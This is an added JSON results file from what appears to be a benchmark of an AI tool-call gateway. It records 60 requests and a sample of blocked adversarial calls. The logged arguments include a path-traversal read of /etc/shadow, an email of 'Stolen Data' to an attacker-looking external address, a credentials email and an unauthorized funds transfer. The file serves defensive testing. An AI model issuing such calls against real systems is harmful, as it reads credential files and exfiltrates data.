@@ -1,0 +1,192 @@
+{
+  "benchmark_schema": "mastyf-mcp-multi-client-ledger-v1.0",
+  "timestamp": "2026-09-05T21:10:51Z",
+  "duration_seconds": 0.0046,
+  "total_requests": 60,
+  "clean_requests": 20,
+  "adversarial_requests": 20,
+  "tainted_requests": 20,
+  "gateway_allows": 20,
+  "gateway_blocks": 40,
+  "backend_executions_recorded": 20,
+  "invariant_violations": 0,
+  "status": "PASS",
+  "observable_ledger_sample": [
+    {
+      "request_id": "rpc-client-b-0-2aebcb",
+      "session_id": "session-client-b-0",
+      "principal": "external_adversary_mallory",
+      "client_type": "adversarial_unauthorized",
+      "tool": "transfer_funds",
+      "args": {
+        "amount": 500.0,
+        "recipient_account": "ACC-998877"
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_UNAUTHORIZED_PRINCIPAL",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.24689
+    },
+    {
+      "request_id": "rpc-client-c-0-61ae64",
+      "session_id": "session-client-c-0",
+      "principal": "web_scraper_carol",
+      "client_type": "tainted_exfiltration_attempt",
+      "tool": "send_email",
+      "args": {
+        "recipient": "partner@company.internal",
+        "subject": "Scraped Info",
+        "body": "Exfiltrating tainted untrusted content..."
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_DENY_PATTERN_MATCHED_BODY",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.2470012
+    },
+    {
+      "request_id": "rpc-client-b-1-ebca1e",
+      "session_id": "session-client-b-1",
+      "principal": "external_adversary_mallory",
+      "client_type": "adversarial_unauthorized",
+      "tool": "read_file",
+      "args": {
+        "path": "/workspace/../../etc/shadow"
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_DENY_PATTERN_MATCHED_PATH",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.247116
+    },
+    {
+      "request_id": "rpc-client-c-1-9b271e",
+      "session_id": "session-client-c-1",
+      "principal": "web_scraper_carol",
+      "client_type": "tainted_exfiltration_attempt",
+      "tool": "send_email",
+      "args": {
+        "recipient": "partner@company.internal",
+        "subject": "Scraped Info",
+        "body": "Exfiltrating tainted untrusted content..."
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_DENY_PATTERN_MATCHED_BODY",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.24719
+    },
+    {
+      "request_id": "rpc-client-b-2-60ce0d",
+      "session_id": "session-client-b-2",
+      "principal": "external_adversary_mallory",
+      "client_type": "adversarial_unauthorized",
+      "tool": "send_email",
+      "args": {
+        "recipient": "attacker@evil-external.com",
+        "subject": "Stolen Data",
+        "body": "Sensitive payload"
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_ARGUMENT_VIOLATION_RECIPIENT",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.247309
+    },
+    {
+      "request_id": "rpc-client-c-2-5f4d2b",
+      "session_id": "session-client-c-2",
+      "principal": "web_scraper_carol",
+      "client_type": "tainted_exfiltration_attempt",
+      "tool": "send_email",
+      "args": {
+        "recipient": "partner@company.internal",
+        "subject": "Scraped Info",
+        "body": "Exfiltrating tainted untrusted content..."
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_DENY_PATTERN_MATCHED_BODY",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.24738
+    },
+    {
+      "request_id": "rpc-client-b-3-bdacdb",
+      "session_id": "session-client-b-3",
+      "principal": "external_adversary_mallory",
+      "client_type": "adversarial_unauthorized",
+      "tool": "send_email",
+      "args": {
+        "recipient": "colleague@company.internal",
+        "subject": "Creds",
+        "body": "Here is the confidential password."
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_DENY_PATTERN_MATCHED_BODY",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.247461
+    },
+    {
+      "request_id": "rpc-client-c-3-0efd6d",
+      "session_id": "session-client-c-3",
+      "principal": "web_scraper_carol",
+      "client_type": "tainted_exfiltration_attempt",
+      "tool": "send_email",
+      "args": {
+        "recipient": "partner@company.internal",
+        "subject": "Scraped Info",
+        "body": "Exfiltrating tainted untrusted content..."
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_DENY_PATTERN_MATCHED_BODY",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.247527
+    },
+    {
+      "request_id": "rpc-client-b-4-be258d",
+      "session_id": "session-client-b-4",
+      "principal": "external_adversary_mallory",
+      "client_type": "adversarial_unauthorized",
+      "tool": "transfer_funds",
+      "args": {
+        "amount": 500.0,
+        "recipient_account": "ACC-998877"
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_UNAUTHORIZED_PRINCIPAL",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.2475991
+    },
+    {
+      "request_id": "rpc-client-c-4-cd4c53",
+      "session_id": "session-client-c-4",
+      "principal": "web_scraper_carol",
+      "client_type": "tainted_exfiltration_attempt",
+      "tool": "send_email",
+      "args": {
+        "recipient": "partner@company.internal",
+        "subject": "Scraped Info",
+        "body": "Exfiltrating tainted untrusted content..."
+      },
+      "gateway_decision": "BLOCK",
+      "reason_code": "CBAC_DENY_PATTERN_MATCHED_BODY",
+      "rpc_error": true,
+      "backend_invoked": false,
+      "backend_invocation_id": null,
+      "timestamp": 1788642651.247662
+    }
+  ]
+}
